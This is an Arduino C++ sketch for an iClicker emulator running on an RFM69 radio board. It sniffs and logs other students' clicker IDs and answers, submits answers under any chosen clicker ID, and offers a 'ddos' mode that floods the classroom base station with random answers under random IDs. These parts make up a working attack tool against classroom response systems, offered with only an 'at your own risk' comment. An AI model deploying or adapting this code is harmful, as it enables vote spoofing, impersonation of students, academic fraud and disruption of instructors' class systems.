#include "iClickerEmulator.h"
#include <RingBufCPP.h>
#include <string.h>

/* UPDATE THESE FOR YOUR PARTICULAR BOARD */
#define IS_RFM69HW false //make true if using w version
#define IRQ_PIN 3 // This is 3 on adafruit feather
#define CSN 8 // This is 8 on adafruit feather
/* END THINGS YOU MUST UPDATE */

#define MAX_BUFFERED_PACKETS 100

iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;

#define MAX_RECVD 500

iClickerAnswerPacket_t recvd[MAX_RECVD];
uint32_t num_recvd = 0;

// This will flood base station with random answers under random ids
// Use at your own risk...

void setup()
{
    Serial.begin(115200);
    clicker.begin(iClickerChannels::AA); //set channel to AA
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    delay(1000);
    //clicker.dumpRegisters();
}


void loop()
{
    //while iclicker answers are coming in, deal with them
    iClickerPacket_t r;
    while (recvBuf.pull(&r) && r.type == PACKET_ANSWER){
        Serial.println("go in");
        handleCapture(r.packet.answerPacket);
    }
    //after that check if the serial channel has any commands
    if (Serial.available() >= 8){
        Serial.println(Serial.available());
        char c = Serial.read();

        switch(c)
        {
            case 'a':
                send();
                break;
            case 'b':
                frequency();
                break;
            case 'c':
                ddos();
                break;
        }
    }
    delay(100);
}

//start ddosing the base, note that all other functionality is disabled while this is occurring
void ddos()
{
    for (int i = 0; i < 7; i++){
        Serial.read();
    }
    while (!shouldExit())
        clicker.ddos(1000);
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
}

//checks to see if the user has send a command to stop ddosing
bool shouldExit()
{
    if(Serial.available() >= 8){
        if(Serial.read() == 'd')
            for(int i = 0; i < 7; i++){
                Serial.read();
            }
            return true;
    }
    for(int i = 0; i < 7; i++){
                Serial.read();
    }
    return false;
}

//changes the frequency of the channel
void frequency(){
    char first = Serial.read();
    char second = Serial.read();
    iClickerChannel channel;
    switch(first)
    {
        case 'A':
            if (second == 'A'){
                channel = iClickerChannels::AA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::AB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::AC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::AD;
            }
            break;
        case 'B':
            if (second == 'A'){
                channel = iClickerChannels::BA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::BB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::BC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::BD;
            }
            break;
        case 'C':
            if (second == 'A'){
                channel = iClickerChannels::CA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::CB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::CC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::CD;
            }
            break;
        case 'D':
            if (second == 'A'){
                channel = iClickerChannels::DA;
            }
            else if (second == 'B'){
                channel = iClickerChannels::DB;
            }
            else if (second == 'C'){
                channel = iClickerChannels::DC;
            }
            else if (second == 'D'){
                channel = iClickerChannels::DD;
            }
            break;
    }
    clicker.setChannel(channel);
    for (int i = 0; i < 5; i++){
        Serial.read();
    }

}

//capture packets that other iclickers have sent
void handleCapture(iClickerAnswerPacket answerPacket){
    char tmp[100];
    uint8_t *id = answerPacket.id;
    char answer = iClickerEmulator::answerChar((iClickerAnswer_t)answerPacket.answer);
    //char answer = iClickerEmulator::answerChar(answerPacket.answer);
    updateRef(answerPacket);
    snprintf(tmp, sizeof(tmp), "%c:%02X %02X %02X %02X\n", answer, id[0], id[1], id[2], id[3]);
    Serial.println(tmp);
}

void updateRef(iClickerAnswerPacket_t p)
{
  uint32_t i = 0;
  for (i = 0; i < num_recvd; i++)
  {
    if (!memcmp(recvd[i].id, p.id, ICLICKER_ID_LEN))
    {
      //update
      recvd[i] = p;
      break;
    }
  }

  //not found and space
  if (i == num_recvd && num_recvd < MAX_RECVD) {
    recvd[num_recvd++] = p;
  }
}

void recvPacketHandler(iClickerPacket *recvd)
{
    recvBuf.add(*recvd);
}

//send answer to base under a certain id
void send()
{
    char hexstr[4];
    uint8_t id[4];
    for (int i = 0; i < 4; i++){
        hexstr[i] = Serial.read();
        id[i] = (uint8_t)hexstr[i];
//        Serial.println(i);
//        Serial.println(id[i]);
//        Serial.println(hexstr[i]);
//        Serial.println();
    }
    int ans_num = Serial.read();
    iClickerAnswer ans;
    if(ans_num == 0){
      ans = ANSWER_A;
    } else if(ans_num == 1){
      ans = ANSWER_B;
    } else if(ans_num == 2){
      ans = ANSWER_C;
    } else if(ans_num == 3){
      ans = ANSWER_D;
    } else if(ans_num == 33){
      ans = ANSWER_E;
    }
    clicker.submitAnswer(id, ans);
    for (int i = 0; i < 2; i++){
      Serial.read();
    }
    Serial.println("we're done");
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
}
